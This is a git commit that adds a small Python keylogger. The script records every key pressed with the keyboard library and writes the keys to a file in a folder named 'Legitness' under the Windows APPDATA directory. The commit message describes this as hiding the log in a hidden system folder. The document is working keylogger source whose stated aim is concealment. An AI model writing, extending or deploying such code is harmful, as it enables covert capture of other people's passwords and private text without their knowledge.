ed13319ad9cdf6c57fe75aa45952b08f6c448317
Diego Untalan <untalan.diego@gmail.com>
2025-07-26 12:48:36 +1000

    Finished iteration 3 - writing to hidden system folder app data

---
+++ logging/iteration3.py
@@ -0,0 +1,26 @@
+# Iteration 3: Hides the log file in App Data folder
+
+import keyboard
+import os
+
+directory = os.path.join(os.getenv("APPDATA"), "Legitness")
+
+# Make the specified directory. If it doesn't exist, 
+try:
+    os.mkdir(directory)
+except FileExistsError:
+    pass
+
+# Name of the log file
+log_path = os.path.join(directory, "text.txt")
+
+# Log keystrokes into specified pathname
+with open(log_path, "w") as f:
+    print('Starting record! Press ESC to exit!')
+    events = keyboard.record(until='escape')
+    
+    for event in events:
+        if event.event_type == keyboard.KEY_DOWN:
+            key = event.name
+            print(key)
+            f.write(f"{key}")
